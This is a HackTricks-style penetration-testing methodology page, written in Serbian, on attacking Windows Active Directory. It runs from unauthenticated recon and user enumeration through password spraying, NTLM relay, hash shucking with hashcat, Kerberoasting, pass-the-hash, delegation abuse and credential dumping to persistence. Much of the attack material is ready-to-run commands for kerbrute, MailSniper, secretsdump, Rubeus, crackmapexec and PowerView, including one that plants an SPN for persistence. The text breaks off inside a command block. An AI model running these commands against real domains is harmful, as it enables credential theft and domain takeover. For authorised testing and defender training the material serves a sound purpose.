# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Osnovni pregled

**Active Directory** predstavlja osnovnu tehnologiju koja omogućava **network administrators** efikasno kreiranje i upravljanje **domenima**, **korisnicima** i **objektima** unutar mreže. Dizajniran je za skaliranje, olakšavajući organizaciju velikog broja korisnika u upravljive **grupe** i **podgrupe**, uz kontrolu **pristupnih prava** na različitim nivoima.

Strukturu **Active Directory** čine tri primarna sloja: **domeni**, **stabla** i **forests**. **Domen** obuhvata skup objekata, kao što su **korisnici** ili **uređaji**, koji dele zajedničku bazu podataka. **Stabla** su grupe tih domena povezane zajedničkom strukturom, dok **forest** predstavlja skup više stabala povezanih kroz **trust relationships**, čineći najviši nivo organizacione strukture. Specifična **pristupna** i **komunikaciona prava** mogu biti dodeljena na svakom od ovih nivoa.

Ključni koncepti unutar **Active Directory** uključuju:

1. **Directory** – Sadrži sve informacije koje se odnose na AD objekte.
2. **Object** – Označava entitete u direktorijumu, uključujući **korisnike**, **grupe** ili **deljene foldere**.
3. **Domain** – Služi kao kontejner za direktorijumske objekte; više domena može koegzistirati unutar jednog **forest**, pri čemu svaki ima sopstveni skup objekata.
4. **Tree** – Grupisanje domena koja dele zajednički root domain.
5. **Forest** – Najviši nivo organizacione strukture u Active Directory, sastavljen od više stabala sa međusobnim **trust relationships**.

**Active Directory Domain Services (AD DS)** obuhvata skup servisa kritičnih za centralizovano upravljanje i komunikaciju unutar mreže. Ti servisi uključuju:

1. **Domain Services** – Centralizuje čuvanje podataka i upravlja interakcijama između **korisnika** i **domena**, uključujući **authentication** i **search** funkcionalnosti.
2. **Certificate Services** – Nadzire kreiranje, distribuciju i upravljanje bezbednim **digital certificates**.
3. **Lightweight Directory Services** – Podržava aplikacije koje koriste direktorijum preko **LDAP protocol**.
4. **Directory Federation Services** – Pruža **single-sign-on** mogućnosti za autentifikaciju korisnika u više web aplikacija u jednoj sesiji.
5. **Rights Management** – Pomaže u zaštiti autorskih materijala tako što reguliše njihovu neovlašćenu distribuciju i upotrebu.
6. **DNS Service** – Ključan za rezoluciju **domain names**.

Za detaljnije objašnjenje pogledajte: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Da biste naučili kako da **napadnete AD**, potrebno je da veoma dobro razumete **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Možete posetiti [https://wadcoms.github.io/](https://wadcoms.github.io) za brz pregled komandi koje možete koristiti za enumeraciju/eksploataciju AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** za izvođenje akcija. Ako pokušate da pristupite mašini preko IP adrese, **koristiće NTLM, a ne kerberos**.

## Recon Active Directory (No creds/sessions)

Ako imate pristup AD okruženju ali nemate kredencijale/sesije, možete:

- **Pentest the network:**
- Skenirajte mrežu, pronađite mašine i otvorene portove i pokušajte da **eksploatišete ranjivosti** ili **izvučete kredencijale** sa njih (na primer, [printers could be very interesting targets](ad-information-in-printers.md)).
- Enumeracija DNS-a može dati informacije o ključnim serverima u domenu kao web, printers, shares, vpn, media, itd.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Pogledajte opštu [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) za više informacija kako to uraditi.
- **Proverite null i Guest pristup na smb servisima** (ovo neće raditi na modernim Windows verzijama):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Detaljniji vodič kako da enumerišete SMB server možete naći ovde:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Detaljniji vodič za enumeraciju LDAP-a možete naći ovde (obrati **posebnu pažnju na anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Sakupljajte kredencijale **impostujući servise sa Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pristupite hostu zloupotrebom [**relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Sakupljajte kredencijale **izlažući** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Izdvojite korisnička imena/ime i prezime iz internih dokumenata, društvenih mreža, servisa (uglavnom web) unutar domen okruženja i takođe iz javno dostupnih izvora.
- Ako pronađete puna imena zaposlenih, možete pokušati različite AD **username conventions** (**[read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)**). Najčešće konvencije su:** _NameSurname_, _Name.Surname_, _NamSur_ (3 slova od svakog), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Alati:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Proverite stranice [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Kada se zatraži **nevažeće korisničko ime**, server će odgovoriti koristeći **Kerberos error** kod _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, što nam omogućava da utvrdimo da je korisničko ime nevažeće. **Važeća korisnička imena** će rezultovati ili **TGT u AS-REP** odgovoru ili greškom _KRB5KDC_ERR_PREAUTH_REQUIRED_, što ukazuje da se od korisnika zahteva pre-authentication.
- **No Authentication against MS-NRPC**: Korišćenjem auth-level = 1 (No authentication) protiv MS-NRPC (Netlogon) interfejsa na domain controller-ima. Metoda poziva funkciju `DsrGetDcNameEx2` nakon bindovanja MS-NRPC interfejsa da proveri da li korisnik ili računalo postoji bez ikakvih kredencijala. Alat [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementira ovu vrstu enumeracije. Istraživanje se može naći [ovde](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ako pronađete jedan od ovih servera u mreži, takođe možete izvršiti **user enumeration** nad njim. Na primer, možete koristiti alat [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Možete pronaći liste korisničkih imena u [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  i ovom ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Međutim, trebalo bi da imate **imena ljudi koji rade u kompaniji** iz recon koraka koji biste trebali da ste ranije izvršili. Sa imenom i prezimenom možete koristiti skriptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) da generišete potencijalna validna korisnička imena.

### Poznavanje jednog ili više korisničkih imena

U redu, dakle već imate važeće korisničko ime ali nemate lozinke... Onda pokušajte:

- [**ASREPRoast**](asreproast.md): Ako korisnik **nema** atribut _DONT_REQ_PREAUTH_ možete **zatražiti AS_REP poruku** za tog korisnika koja će sadržati neke podatke šifrovane izvedenicom korisničke lozinke.
- [**Password Spraying**](password-spraying.md): Pokušajte najčešće **lozinke** sa svakim od otkrivenih korisnika, možda neki korisnik koristi lošu lozinku (imajte na umu politiku lozinki!).
- Napomena: takođe možete pokušati password spraying protiv OWA servera da biste pokušali pristupiti korisničkim mail serverima.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Možda možete da **dobijete** neke challenge **hash-ove** za krckanje trovanjem nekih protokola na **mreži**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ako ste uspeli da enumerišete Active Directory imaćete **više e-mailova i bolje razumevanje mreže**. Možda ćete moći da izvršite NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) kako biste dobili pristup AD okruženju.

### NetExec workspace-driven recon & relay posture checks

- Koristite **`nxcdb` workspaces** da čuvate AD recon stanje po angažmanu: `workspace create <name>` stvara per-protocol SQLite DBs pod `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Menjajte prikaze sa `proto smb|mssql|winrm` i listajte prikupljene tajne sa `creds`. Ručno obrišite osetljive podatke kada završite: `rm -rf ~/.nxc/workspaces/<name>`.
- Brzo otkrivanje subnet-a pomoću **`netexec smb <cidr>`** otkriva **domain**, **OS build**, **SMB signing requirements**, i **Null Auth**. Članovi koji prikazuju `(signing:False)` su **relay-prone**, dok DC-ovi često zahtevaju signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Kada je **SMB relay to the DC is blocked** by signing, ipak proverite **LDAP** posture: `netexec ldap <dc>` ističe `(signing:None)` / weak channel binding. DC sa SMB signing required ali LDAP signing disabled ostaje validan **relay-to-LDAP** cilj za zloupotrebe kao **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs ponekad **ugrađuju maskirane admin lozinke u HTML**. Pregled source/devtools može otkriti cleartext (npr., `<input value="<password>">`), omogućavajući Basic-auth pristup za skeniranje/printanje repozitorijuma.
- Preuzeti print jobs mogu sadržati **plaintext onboarding docs** sa lozinkama po korisniku. Prilikom testiranja držite parove usklađenim:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Ukradi NTLM Creds

Ako možete **pristupiti drugim PC-jevima ili deljenim resursima** pomoću **null ili guest korisnika**, možete **postaviti fajlove** (npr. SCF file) koji, ako se nekako otvore, će **pokrenuti NTLM autentifikaciju prema vama** tako da možete **ukrasti** **NTLM challenge** da biste ga razbili:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tretira svaki NT hash koji već posedujete kao kandidata za lozinku za druge, sporije formate čiji se ključni materijal direktno izvodi iz NT hasha. Umesto da brute-forcujete duge passphrase-ove u Kerberos RC4 tickets, NetNTLM challenges ili cached credentials, ubacite NT hash-e u Hashcat-ove NT-candidate mode-ove i dozvolite mu da potvrdi ponovnu upotrebu lozinke bez ikad saznanja plaintext-a. Ovo je posebno moćno posle kompromitovanja domena kada možete sakupljati hiljade aktuelnih i istorijskih NT hash-eva.

Koristite shucking kada:

- Imate korpus NT hash-eva iz DCSync, SAM/SECURITY dumps, ili credential vaults i treba da testirate za reuse u drugim domenima/forest-ovima.
- Uhvatite RC4-bazirani Kerberos materijal (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, ili DCC/DCC2 blobove.
- Želite brzo dokazati ponovnu upotrebu za duge, neprobijive passphrase-ove i odmah pivotirati putem Pass-the-Hash.

Tehnika **ne radi** protiv tipova enkripcije čiji ključevi nisu izvedeni iz NT hasha (npr. Kerberos etype 17/18 AES). Ako domen primorava samo AES, morate se vratiti na regularne password mode-ove.

#### Building an NT hash corpus

- **DCSync/NTDS** – Koristite `secretsdump.py` sa history da dobijete najveći mogući skup NT hash-eva (i njihove prethodne vrednosti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History unosi dramatično proširuju skup kandidata jer Microsoft može čuvati do 24 prethodna hasha po nalogu. Za više načina da harvest-ujete NTDS tajne pogledajte:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ili Mimikatz `lsadump::sam /patch`) izvlači lokalne SAM/SECURITY podatke i kešovane domain logone (DCC/DCC2). Deduplicirajte i dodajte te hash-e u isti `nt_candidates.txt` fajl.
- **Track metadata** – Sačuvajte username/domain koji je proizveo svaki hash (čak i ako wordlist sadrži samo hex). Poklapajući hash-e odmah pokazuju koji principal ponovo koristi lozinku kada Hashcat ispiše pobednički kandidat.
- Preferirajte kandidate iz istog forest-a ili iz trusted forest-a; to maksimizira šansu za overlap kada shuck-ujete.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Beleške:

- NT-candidate inputi **mora** da ostanu raw 32-hex NT hash-evi. Isključite rule engine (bez `-r`, bez hybrid modova) jer mangling kvari kandidatni ključni materijal.
- Ovi modovi nisu inherentno brži, ali NTLM keyspace (~30,000 MH/s na M3 Max) je ~100× brži od Kerberos RC4 (~300 MH/s). Testiranje kurirane NT liste je znatno jeftinije nego istraživanje celog password prostora u sporom formatu.
- Uvek pokrenite **najnoviju Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) jer su modovi 31500/31600/35300/35400 nedavno dodati.
- Trenutno ne postoji NT mod za AS-REQ Pre-Auth, a AES etypes (19600/19700) zahtevaju plaintext lozinku jer se njihovi ključevi izvode putem PBKDF2 iz UTF-16LE lozinki, a ne iz raw NT hash-eva.

#### Primer – Kerberoast RC4 (mode 35300)

1. Uhvatite RC4 TGS za ciljanu SPN koristeći low-privileged korisnika (pogledajte Kerberoast stranicu za detalje):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck-ujte ticket koristeći vašu NT listu:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat izvodi RC4 ključ iz svakog NT kandidata i validira `$krb5tgs$23$...` blob. Poklapanje potvrđuje da servisni nalog koristi jedan od vaših postojećih NT hash-eva.

3. Odmah pivotirajte putem PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcionalno možete kasnije recover-ovati plaintext pomoću `hashcat -m 1000 <matched_hash> wordlists/` ako je potrebno.

#### Primer – Cached credentials (mode 31600)

1. Dump-ujte cached logone sa kompromitovanog workstation-a:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopirajte DCC2 liniju za interesantnog domain korisnika u `dcc2_highpriv.txt` i shuck-ujte je:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Uspešno poklapanje daje NT hash koji je već poznat iz vaše liste, potvrđujući da kešovani korisnik ponovo koristi lozinku. Koristite ga direktno za PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ili ga brute-force-ujte u brzom NTLM modu da biste recover-ovali string.

Isti workflow se primenjuje na NetNTLM challenge-response-e (`-m 27000/27100`) i DCC (`-m 31500`). Kad se identifikuje poklapanje, možete pokrenuti relay, SMB/WMI/WinRM PtH, ili ponovo crack-ovati NT hash offline koristeći maske/pravila.

## Enumerating Active Directory WITH credentials/session

Za ovu fazu potrebno je da budete **kompromitovali credentials ili session važećeg domain account-a.** Ako imate neke validne credentials ili shell kao domain user, **zapamtite da su opcije pomenute ranije i dalje opcije za kompromitovanje drugih korisnika**.

Pre nego što počnete authenticated enumeration, trebalo bi da znate šta je **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Kompromitovanje naloga je **velik korak za početak kompromitovanja celog domena**, jer ćete moći da započnete **Active Directory Enumeration:**

Što se tiče [**ASREPRoast**](asreproast.md) sada možete naći sve moguće vulnerable korisnike, a što se tiče [**Password Spraying**](password-spraying.md) možete dobiti **listu svih korisničkih imena** i pokušati lozinku kompromitovanog naloga, prazne lozinke i nove obećavajuće lozinke.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Možete takođe koristiti [**powershell for recon**](../basic-powershell-for-pentesters/index.html) što će biti stealthier
- Možete takođe koristiti [**powerview**](../basic-powershell-for-pentesters/powerview.md) za ekstrakciju detaljnijih informacija
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- Ako koristite **Linux**, možete takođe enumerisati domen koristeći [**pywerview**](https://github.com/the-useless-one/pywerview).
- Takođe možete probati automatizovane alate kao što su:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Veoma je lako dobiti sva korisnička imena domena iz Windows-a (`net user /domain` ,`Get-DomainUser` ili `wmic useraccount get name,sid`). U Linuxu, možete koristiti: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ili `enum4linux -a -u "user" -p "password" <DC IP>`

> Čak i ako ova sekcija Enumeration izgleda mala, ovo je najvažniji deo od svega. Posetite linkove (pre svega one za cmd, powershell, powerview i BloodHound), naučite kako da enumerišete domen i vežbajte dok se ne osećate udobno. Tokom assess-menta, ovo će biti ključni trenutak da nađete put do DA ili da odlučite da se ništa ne može uraditi.

### Kerberoast

Kerberoasting uključuje dobijanje **TGS tickets** koje koriste servisi vezani za korisničke naloge i offline crack-ovanje njihove enkripcije — koja se zasniva na korisničkim lozinkama.

Više o tome u:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Kada dobijete neke credentials možete proveriti da li imate access na bilo koji **machine**. Za to možete koristiti **CrackMapExec** da pokušate konekciju na više servera različitim protokolima, u skladu sa vašim port scan-ovima.

### Lokalno eskaliranje privilegija

Ako ste kompromitovali credentials ili session kao običan domain korisnik i imate **access** tim korisnikom na **bilo koji mašinu u domenu**, trebalo bi da pokušate da nađete način da **eskalirate privilegije lokalno i loot-ujete za credentials**. Samo sa lokalnim administratorskim privilegijama moći ćete da **dump-ujete hash-e drugih korisnika** iz memorije (LSASS) i lokalno (SAM).

Postoji kompletna stranica u ovoj knjizi o [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) i checklist-a [**checklist**](../checklist-windows-privilege-escalation.md). Takođe, ne zaboravite da koristite [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Veoma je **neverovatno** da ćete naći **tickete** u trenutnom korisniku koji vam daju dozvolu da pristupite neočekivanim resursima, ali možete proveriti:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ako ste uspeli da izvršite enumeraciju Active Directory-ja imaćete **više email adresa i bolje razumevanje mreže**. Možda ćete moći da primenite NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Sada kada imate neke osnovne credentials, treba da proverite da li možete da **pronađete** neke **zanimljive fajlove koji se dele unutar AD**. To možete raditi ručno, ali je veoma dosadno i repetitivno (pogotovo ako nađete stotine dokumenata koje treba pregledati).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ako možete da **pristupite drugim PCs ili share-ovima** mogli biste **postaviti fajlove** (npr. SCF file) koji, ako se na neki način otvore, će t**rigger an NTLM authentication against you** tako da možete **steal** **the NTLM challenge** da ga crack-ujete:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ova ranjivost je omogućavala bilo kojem autentifikovanom korisniku da **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Za sledeće tehnike običan domain user nije dovoljan — potrebne su posebne privilegije/credentials da biste izveli ove napade.**

### Hash extraction

Nadamo se da ste uspeli da **compromise some local admin** nalog koristeći [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) uključujući relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Zatim je vreme da dump-ujete sve hash-e iz memorije i lokalno.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Kada imate hash korisnika**, možete ga koristiti da se **pretvarate** u tog korisnika.\
Treba da koristite neki **tool** koji će **izvršiti NTLM authentication koristeći** taj **hash**, **ili** možete kreirati novi **sessionlogon** i **inject** taj **hash** u **LSASS**, tako da kada se izvrši bilo koja **NTLM authentication**, taj **hash će biti upotrebljen.** Poslednja opcija je ono što radi mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ovaj napad ima za cilj da **upotrebi user NTLM hash za zahtev Kerberos tiketa**, kao alternativa uobičajenom Pass The Hash preko NTLM protokola. Stoga može biti posebno **korisno na mrežama gde je NTLM protocol onemogućen** i gde je samo **Kerberos dozvoljen** kao protokol autentifikacije.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

U metodi napada **Pass The Ticket (PTT)**, napadači **ukradu korisnikov authentication ticket** umesto njegove lozinke ili hash vrednosti. Ovaj ukradeni tiket se zatim koristi da se **pretvaraju u tog korisnika**, dobijajući neovlašćen pristup resursima i servisima unutar mreže.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ako imate **hash** ili **password** lokalnog administratora, trebalo bi da pokušate da se pomoću njih **ulogujete lokalno** na druge **PCs**.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Imajte na umu da je ovo prilično **bučno** i **LAPS** bi to **ublažio**.

### MSSQL Abuse & Trusted Links

Ako korisnik ima privilegije da **pristupi MSSQL instancama**, mogao bi da ih iskoristi da **izvrši komande** na MSSQL hostu (ako se pokreće kao SA), **ukrade** NetNTLM **hash** ili čak izvede **relay attack**.\
Takođe, ako je MSSQL instanca poverena (database link) od strane druge MSSQL instance. Ako korisnik ima privilegije nad poverenom bazom, moći će da **iskoristi odnos poverenja za izvršavanje upita i u drugoj instanci**. Ovi trustovi se mogu nizati i u nekom trenutku korisnik može naći pogrešno konfigurisanu bazu gde može da izvršava komande.\
**Povezivanja između baza rade čak i preko forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory and deployment suites često izlažu moćne puteve do kredencijala i izvršenja koda. Pogledajte:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ako pronađete bilo koji Computer objekat sa atributom [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i imate domenske privilegije na tom računaru, moći ćete da dump-ujete TGT-ove iz memorije svih korisnika koji se prijave na računar.\
Dakle, ako se **Domain Admin prijavi na taj računar**, moći ćete da dump-ujete njegov TGT i da ga impersonirate koristeći [Pass the Ticket](pass-the-ticket.md).\
Zahvaljujući constrained delegation mogli biste čak **automatski kompromitovati Print Server** (nadamo se da će to biti DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ako je korisniku ili računaru dozvoljena "Constrained Delegation", on će moći da **imponira bilo kom korisniku da pristupi nekim servisima na računaru**.\
Zatim, ako **kompromitujete hash** tog korisnika/računara, moći ćete da **imponirate bilo kom korisniku** (čak i domain admin-ima) da pristupi tim servisima.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Imati **WRITE** privilegiju nad Active Directory objektom udaljenog računara omogućava postizanje izvršenja koda sa **povišenim privilegijama**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Kompromitovani korisnik može imati neke **interesantne privilegije nad nekim domen objektima** koje bi vam omogućile da kasnije **migrate-ujete lateralno/** **eskalirate** privilegije.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Otkrivanje **Spool servisa koji osluškuje** unutar domena može se **zloupotrebiti** za **dohvatanje novih kredencijala** i **eskalaciju privilegija**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Ako **drugi korisnici** **pristupaju** **kompromitovanom** računaru, moguće je **sakupiti kredencijale iz memorije** i čak **injektovati beacone u njihove procese** da biste ih impersonirali.\
Obično korisnici pristupaju sistemu preko RDP-a, pa evo kako izvesti par napada nad trećim RDP sesijama:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** pruža sistem za upravljanje **lokalnim Administrator password-om** na domen-priključenim računarima, osiguravajući da je **nasumično generisan**, jedinstven i često **menjan**. Ovi password-i se čuvaju u Active Directory i pristup im je kontrolisan kroz ACL-ove samo za autorizovane korisnike. Sa dovoljnim permisijama za pristup ovim password-ima, pivotovanje na druge računare postaje moguće.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Sakupljanje sertifikata** sa kompromitovanog mašine može biti način za eskalaciju privilegija unutar okruženja:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Ako su konfigurirane **ranjive template-ove**, moguće ih je zloupotrebiti za eskalaciju privilegija:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Kada dobijete **Domain Admin** ili još bolje **Enterprise Admin** privilegije, možete **dump-ovati** **domen bazu podataka**: _ntds.dit_.

[**Više informacija o DCSync napadu može se naći ovde**](dcsync.md).

[**Više informacija o tome kako ukrasti NTDS.dit može se naći ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Neke od tehnika ranije opisanih mogu se koristiti za persistence.\
Na primer, možete:

- Učiniti korisnike ranjivim na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
